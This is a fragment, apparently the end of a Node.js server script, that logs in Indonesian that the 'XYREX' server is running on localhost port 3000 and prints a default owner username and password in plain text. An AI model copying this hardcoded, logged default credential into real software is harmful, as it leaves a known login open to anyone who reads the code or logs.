  console.log('[XYREX] Server jalan di http://localhost:3000');
  console.log('[XYREX] Owner default: Dlizz / 20111608');
});
